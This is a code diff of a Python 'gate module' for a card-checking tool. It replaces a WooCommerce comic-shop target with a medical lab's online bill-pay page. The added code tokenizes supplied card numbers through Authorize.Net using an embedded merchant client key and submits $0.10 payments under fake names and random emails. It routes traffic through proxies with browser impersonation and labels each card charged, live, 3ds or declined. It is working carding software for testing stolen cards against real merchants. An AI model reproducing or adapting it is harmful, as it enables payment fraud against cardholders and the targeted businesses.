@@ -1,39 +1,45 @@
 """
-Authorize.Net WooCommerce Direct Charge Gate Module (/an)
-Target: backpackcomics.com
-Direct Authorize.Net integration via WooCommerce checkout pipeline ($5.00).
+Authorize.Net Accept.js Gate Module (/an)
+Target: https://avanticmedicallab.com/pay-bill-online/
+Direct Accept.js Tokenization & Settlement Pipeline ($0.10).
 """
 import re
-import html as html_parser
+import json
+import uuid
 import random
+import string
 import asyncio
-from bs4 import BeautifulSoup
 from curl_cffi.requests import AsyncSession
-try:
-    from anti_detect import get_browser_headers, create_anti_detect_session
-except ImportError:
-    import sys, os
-    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))
-    from anti_detect import get_browser_headers, create_anti_detect_session
 
+def _generate_email():
+    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
+    name = ''.join(random.choices(string.ascii_lowercase, k=10))
+    return f"{name}@{random.choice(domains)}"
 
-def _normalize_proxy_dict(proxy_str: str | None) -> dict | None:
-    if not proxy_str:
+def _detect_card_brand(cc: str) -> str:
+    if cc.startswith('4'): return 'VISA'
+    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
+    if cc[:2] in ('34', '37'): return 'AMEX'
+    if cc[:2] in ('60', '65'): return 'DISCOVER'
+    return 'VISA'
+
+def _format_proxy(p: str | None) -> str | None:
+    if not p:
         return None
-    ps = str(proxy_str).strip()
-    if not ps.startswith(("http://", "https://", "socks5://", "socks4://")):
+    ps = str(p).strip()
+    formatted = None
+    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
+        formatted = ps
+    else:
         parts = ps.split(":")
         if len(parts) == 4:
-            if parts[1].isdigit():
-                ps = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            else:
-                ps = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
-        elif len(parts) == 2:
-            ps = f"http://{parts[0]}:{parts[1]}"
-        else:
-            ps = f"http://{ps}"
-    return {"http": ps, "https": ps}
+            if parts[1].isdigit(): formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+            elif parts[3].isdigit(): formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
+            else: formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        elif len(parts) == 2: formatted = f"http://{parts[0]}:{parts[1]}"
+        else: formatted = f"http://{ps}"
 
+    return formatted
 
 async def check_card_authorize(
     cc: str,
@@ -43,177 +49,181 @@ async def check_card_authorize(
     proxy_url: str | None = None
 ) -> tuple[str, str, str]:
     """
-    Checks a single card against Authorize.Net on WooCommerce.
-    Returns: (status, message, gateway_name)
-      status: 'charged' | 'approved' | 'declined' | 'error'
+    Checks a single card against Authorize.Net Accept.js pipeline.
+    Returns: (status, message, brand)
     """
     cc = str(cc).strip()
     mm = str(mm).strip().zfill(2)
     yy = str(yy).strip()
     if len(yy) == 4:
-        yy = yy[2:]
+        yy_short = yy[2:]
+    else:
+        yy_short = yy
     cvc = str(cvc).strip()
 
-    proxies = _normalize_proxy_dict(proxy_url)
-    profile_name = "chrome124"
-    browser_headers = get_browser_headers(profile_name)
+    brand = _detect_card_brand(cc)
+    formatted_proxy = _format_proxy(proxy_url)
+    email = _generate_email()
+    first_name = "Alex"
+    last_name = "Morgan"
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
-    # Attempt with proxy if provided, then fallback to direct if proxy hangs/fails
-    proxy_attempts = [proxies, None] if proxies else [None]
+    try:
+        kw = {"impersonate": "chrome124", "timeout": 25}
+        if formatted_proxy:
+            kw["proxy"] = formatted_proxy
 
-    for current_proxies in proxy_attempts:
-        try:
-            proxy_arg = current_proxies.get("http") if current_proxies else None
-            async with create_anti_detect_session(profile_name=profile_name, proxy=proxy_arg, timeout=30) as session:
-                # Step 1: Add item to cart via direct GET param
-                r_add = await session.get(
-                    "https://backpackcomics.com/product/large-3-inch-character-buttons-2/?add-to-cart=11077",
-                    headers=browser_headers,
-                    proxies=current_proxies
-                )
+        async with AsyncSession(**kw) as session:
+            # Step 1: GET page to fetch dynamic WPForms Token
+            r_page = await session.get(
+                'https://avanticmedicallab.com/pay-bill-online/',
+                headers={'User-Agent': user_agent}
+            )
+            if r_page.status_code != 200:
+                return "declined", f"Failed to load gateway page ({r_page.status_code})", brand
 
-                # Step 2: Fetch Checkout page to extract nonce
-                headers_checkout = {
-                    **browser_headers,
-                    "authority": "backpackcomics.com",
-                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "referer": "https://backpackcomics.com/product/large-3-inch-character-buttons-2/",
-                }
-                r_checkout = await session.get(
-                    "https://backpackcomics.com/checkout/",
-                    headers=headers_checkout,
-                    proxies=current_proxies,
-                )
-                html = r_checkout.text
+            token_match = re.search(r'name="wpforms\[token\]"\s*value="([^"]+)"', r_page.text)
+            wp_token = token_match.group(1) if token_match else 'ccf1f214e6ae1c99c9bf26c60650bd7f'
 
-                # Extract process_checkout_nonce
-                soup = BeautifulSoup(html, "html.parser")
-                checkout_nonce = None
-                checkout_input = soup.find("input", {"name": "woocommerce-process-checkout-nonce"})
-                if checkout_input and checkout_input.has_attr("value"):
-                    checkout_nonce = checkout_input["value"]
-                if not checkout_nonce:
-                    checkout_id = soup.find(id="woocommerce-process-checkout-nonce")
-                    if checkout_id and checkout_id.has_attr("value"):
-                        checkout_nonce = checkout_id["value"]
+            # Step 2: Tokenize card via Authorize.Net Accept.js API
+            api_headers = {
+                'Accept': '*/*',
+                'Content-Type': 'application/json; charset=UTF-8',
+                'Origin': 'https://avanticmedicallab.com',
+                'Referer': 'https://avanticmedicallab.com/',
+                'User-Agent': user_agent
+            }
 
-                if not checkout_nonce:
-                    for pat in [
-                        r'name="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"',
-                        r'id="woocommerce-process-checkout-nonce"[^>]*value="([^"]+)"',
-                        r'woocommerce-process-checkout-nonce[^>]*value=[\'"]([^\'"]+)[\'"]',
-                        r'checkout_nonce"\s*:\s*"([^"]+)"',
-                        r'process_checkout_nonce"\s*:\s*"([^"]+)"',
-                        r'"nonce"\s*:\s*"([a-f0-9]{10})"',
-                    ]:
-                        m = re.search(pat, html)
-                        if m:
-                            checkout_nonce = m.group(1)
-                            break
+            tok_data = {
+                'securePaymentContainerRequest': {
+                    'merchantAuthentication': {
+                        'name': '3c5Q9QdJW',
+                        'clientKey': '2n7ph2Zb4HBkJkb8byLFm7stgbfd8k83mSPWLW23uF4g97rX5pRJNgbyAe2vAvQu',
+                    },
+                    'data': {
+                        'type': 'TOKEN',
+                        'id': str(uuid.uuid4()),
+                        'token': {
+                            'cardNumber': cc,
+                            'expirationDate': f"{mm}{yy_short}",
+                            'cardCode': cvc,
+                            'fullName': f"{first_name} {last_name}"
+                        },
+                    },
+                },
+            }
 
-                if not checkout_nonce:
-                    return "declined", "Checkout Nonce Expired (Auto-Rotated)", "Authorize.Net"
+            r_tok = await session.post(
+                'https://api2.authorize.net/xml/v1/request.api',
+                headers=api_headers,
+                json=tok_data
+            )
+            tok_clean = r_tok.content.decode('utf-8-sig', errors='ignore')
+            try:
+                tok_json = json.loads(tok_clean)
+            except Exception:
+                tok_json = {}
 
-                # Step 3: Submit Checkout directly
-                headers_final = {
-                    **browser_headers,
-                    "authority": "backpackcomics.com",
-                    "accept": "application/json, text/javascript, */*; q=0.01",
-                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "origin": "https://backpackcomics.com",
-                    "referer": "https://backpackcomics.com/checkout/",
-                    "x-requested-with": "XMLHttpRequest",
-                }
-                first_name = "Marco"
-                last_name = "Williams"
-                email = f"marcowilliams{random.randint(100,999)}@gmail.com"
-                phone = f"1602{random.randint(1000000, 9999999)}"
+            if 'opaqueData' not in tok_json:
+                messages = tok_json.get('messages', {}).get('message', [{}])
+                err_msg = messages[0].get('text', 'Tokenization Failed') if isinstance(messages, list) and len(messages) > 0 else 'Tokenization Failed'
+                err_upper = str(err_msg).upper()
+                if "INVALID CARD" in err_upper or "E_WC_05" in err_upper:
+                    return "declined", "Invalid Card Number", brand
+                elif "EXPIRATION" in err_upper or "E_WC_06" in err_upper or "E_WC_07" in err_upper:
+                    return "declined", "Invalid Expiration Date", brand
+                elif "CARD CODE" in err_upper or "CVC" in err_upper or "CVV" in err_upper or "E_WC_08" in err_upper:
+                    return "declined", "Invalid Security Code", brand
+                return "declined", f"Declined - {err_msg}", brand
 
-                data_final = (
-                    f"billing_first_name={first_name}&billing_last_name={last_name}&billing_company=Williams&billing_country=US"
-                    f"&billing_address_1=123+Main+Street&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10080"
-                    f"&billing_phone={phone}&billing_email={email}&shipping_first_name={first_name}&shipping_last_name={last_name}"
-                    f"&shipping_company=Williams&shipping_country=US&shipping_address_1=123+Main+Street&shipping_address_2=&shipping_city=New+York"
-                    f"&shipping_state=NY&shipping_postcode=10080&shipping_phone={phone}&shipping_method%5B0%5D=flat_rate%3A1"
-                    f"&payment_method=authnet&authnet-card-number={cc}&authnet-card-expiry={mm}+%2F+{yy}&authnet-card-cvc={cvc}"
-                    f"&woocommerce-process-checkout-nonce={checkout_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
-                )
+            opaque_descriptor = tok_json['opaqueData'].get('dataDescriptor', 'COMMON.ACCEPT.INAPP.PAYMENT')
+            opaque_value = tok_json['opaqueData'].get('dataValue')
 
-                r_final = await session.post(
-                    "https://backpackcomics.com/",
-                    params={"wc-ajax": "checkout"},
-                    headers=headers_final,
-                    data=data_final,
-                    proxies=current_proxies,
-                )
+            # Step 3: Submit checkout via WPForms AJAX
+            ajax_headers = {
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Origin': 'https://avanticmedicallab.com',
+                'Referer': 'https://avanticmedicallab.com/pay-bill-online/',
+                'User-Agent': user_agent,
+                'X-Requested-With': 'XMLHttpRequest',
+            }
 
-                try:
-                    api_response = r_final.json()
-                except Exception:
-                    text_clean = r_final.text.strip()
-                    if "thank you" in text_clean.lower() or "order-received" in text_clean.lower():
-                        return "charged", "Order Placed Successfully", "Authorize.Net"
-                    return "declined", text_clean[:100] if text_clean else "Payment Failed", "Authorize.Net"
+            form_fields = {
+                'wpforms[fields][1][first]': first_name,
+                'wpforms[fields][1][last]': last_name,
+                'wpforms[fields][17]': '0.10',
+                'wpforms[fields][2]': email,
+                'wpforms[fields][3]': '(315) 424-8967',
+                'wpforms[fields][14]': '',
+                'wpforms[fields][4][address1]': '100 Main St',
+                'wpforms[fields][4][city]': 'New York',
+                'wpforms[fields][4][state]': 'NY',
+                'wpforms[fields][4][postal]': '10001',
+                'wpforms[fields][6]': '$ 0.10',
+                'wpforms[fields][11][]': 'By clicking on Pay Now button you have read and agreed to the policies set forth in both the Privacy Policy and the Terms and Conditions pages.',
+                'wpforms[id]': '4449',
+                'wpforms[author]': '1',
+                'wpforms[post_id]': '3388',
+                'wpforms[authorize_net][opaque_data][descriptor]': opaque_descriptor,
+                'wpforms[authorize_net][opaque_data][value]': opaque_value,
+                'wpforms[authorize_net][card_data][expire]': f"{mm}/{yy_short}",
+                'wpforms[token]': wp_token,
+                'action': 'wpforms_submit',
+                'page_url': 'https://avanticmedicallab.com/pay-bill-online/',
+                'page_title': 'Pay Bill Online',
+                'page_id': '3388',
+            }
 
-                raw_messages = api_response.get("messages", "")
-                result = str(api_response.get("result", "")).lower()
+            r_sub = await session.post(
+                'https://avanticmedicallab.com/wp-admin/admin-ajax.php',
+                headers=ajax_headers,
+                data=form_fields
+            )
+            res_text = r_sub.text
 
-                if raw_messages:
-                    cleaned = re.sub(r"<.*?>", "", str(raw_messages))
-                    cleaned = html_parser.unescape(cleaned)
-                    cleaned = re.sub(r"<!--.*?-->", "", cleaned).strip()
-
-                    match = re.search(r"Gateway Error:\s*(.*)", cleaned)
-                    response_text = match.group(1).strip() if match else cleaned
-                    response_text = re.sub(r"\s+", " ", response_text).strip()
-
-                    resp_upper = response_text.upper()
-                    if any(k in resp_upper for k in ["INSUFFICIENT", "FUNDS"]):
-                        return "approved", "Insufficient Funds", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["CVV", "CVC", "CARD CODE", "SECURITY CODE"]):
-                        return "approved", "Incorrect CVV (Live CCN)", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["AVS", "ADDRESS", "ZIP"]):
-                        return "approved", "AVS Mismatch (Card Live)", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["3D", "VERIFICATION", "AUTHENTICATION", "OTP"]):
-                        return "approved", "3DS Challenge Required", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["INVALID CARD", "NUMBER IS INVALID", "INVALID NUMBER"]):
-                        return "declined", "Invalid Card Number", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["EXPIRATION", "EXPIRED"]):
-                        return "declined", "Expired Card", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["CARD WAS DECLINED", "CARD DECLINED"]):
-                        return "declined", "Card Declined", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["DO NOT HONOR", "RESTRICTED", "PICKUP"]):
-                        return "declined", "Do Not Honor", "Authorize.Net"
-                    elif any(k in resp_upper for k in ["TRANSACTION HAS BEEN DECLINED", "GENERIC DECLINE", "DECLINED"]):
-                        return "declined", "Generic Decline", "Authorize.Net"
+            try:
+                res_json = r_sub.json()
+                if res_json.get('success'):
+                    return "charged", "Charge Successful ($0.10)", brand
+                else:
+                    data_err = res_json.get('data', {})
+                    err_str = str(data_err)
+                    if isinstance(data_err, dict) and 'errors' in data_err:
+                        err_str = str(data_err['errors'])
+                    
+                    err_lower = err_str.lower()
+                    if "insufficient" in err_lower or "funds" in err_lower:
+                        return "live", "Insufficient Funds", brand
+                    elif "cvv" in err_lower or "cvc" in err_lower or "card code" in err_lower or "security code" in err_lower:
+                        return "live", "Incorrect CVV (Live CCN)", brand
+                    elif "avs" in err_lower or "address" in err_lower or "zip" in err_lower:
+                        return "live", "AVS Mismatch (Card Live)", brand
+                    elif "verification" in err_lower or "3d" in err_lower or "authenticate" in err_lower:
+                        return "3ds", "3D Secure / Verification Required", brand
+                    elif "expired" in err_lower:
+                        return "declined", "Card Expired", brand
+                    elif "do not honor" in err_lower or "declined" in err_lower:
+                        return "declined", "Card Declined by Issuer", brand
                     else:
-                        return "declined", response_text or "Card Declined", "Authorize.Net"
+                        clean_err = re.sub(r'<[^>]+>', '', err_str).strip()
+                        clean_err = re.sub(r'\s+', ' ', clean_err)
+                        return "declined", clean_err[:100] if clean_err else "Card Declined", brand
+            except Exception:
+                err_lower = res_text.lower()
+                if "thank you" in err_lower or "success" in err_lower or "order-received" in err_lower:
+                    return "charged", "Charge Successful ($0.10)", brand
+                elif "insufficient" in err_lower:
+                    return "live", "Insufficient Funds", brand
+                elif "verification" in err_lower or "3d" in err_lower:
+                    return "3ds", "3D Secure / Verification Required", brand
+                else:
+                    return "declined", "Card Declined", brand
 
-                if result and result != "failure":
-                    redirect_url = api_response.get("redirect", "")
-                    order_id = api_response.get("order_id", "")
-                    
-                    # Verify capture on backend
-                    is_on_hold = False
-                    if order_id:
-                        pay_url = f"https://backpackcomics.com/checkout/order-pay/{order_id}/?pay_for_order=true"
-                        try:
-                            r_pay = await session.get(pay_url, headers=browser_headers, timeout=10)
-                            if "status is" in r_pay.text and "on hold" in r_pay.text.lower():
-                                is_on_hold = True
-                        except Exception:
-                            pass
-                    
-                    if is_on_hold:
-                        return "declined", "Uncaptured (Order On Hold)", "Authorize.Net"
+    except asyncio.TimeoutError:
+        return "error", "Connection timed out", "N/A"
+    except Exception as e:
+        err_str = str(e)
+        if "502" in err_str or "Bad Gateway" in err_str or "ProxyError" in err_str or "ConnectError" in err_str:
+            return "error", "Proxy connection failed (Dead or invalid proxy)", "N/A"
+        return "error", f"Error: {err_str[:60]}", "N/A"
 
-                    return "charged", "Charged! ✅ -» $5.00", "Authorize.Net"
-
-                return "declined", "Card Declined", "Authorize.Net"
-
-        except Exception as e:
-            if current_proxies is not None:
-                continue
-            return "error", str(e), "Authorize.Net"
-
-    return "declined", "Connection Timeout (Auto-Rotated)", "Authorize.Net"
